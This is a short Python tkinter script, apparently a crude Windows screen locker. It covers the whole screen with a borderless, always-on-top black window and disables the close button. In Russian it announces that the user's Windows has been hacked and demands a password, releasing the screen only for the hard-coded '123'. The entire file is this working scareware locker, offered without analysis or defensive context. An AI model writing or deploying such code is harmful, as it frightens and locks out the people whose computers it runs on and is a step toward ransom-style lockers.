import sys
import tkinter

root = tkinter.Tk()

def Quit():
    pass

def checkPassword(arg):
    if password.get() == "123":
        root.destroy()
        sys.exit()


X = root.winfo_screenwidth()
Y = root.winfo_screenheight()

bg = "black"
font = "Arial 25 bold"

root["bg"] = bg
root.protocol("WM_DELETE_WINDOW", Quit)
root.attributes("-topmost", True)
root.attributes("-toolwindow", True)
root.geometry(f'{X}x{Y}')
root.overrideredirect(True)

tkinter.Label(text="Ваш windows взломан!", fg="red", bg=bg, font=font).pack()
tkinter.Label(text="\n\n\n\n\nВведите пароль", fg="white", bg=bg, font=font).pack()

password = tkinter.Entry(font=font)
password.pack()
password.bind("<Return>", checkPassword)

root.mainloop()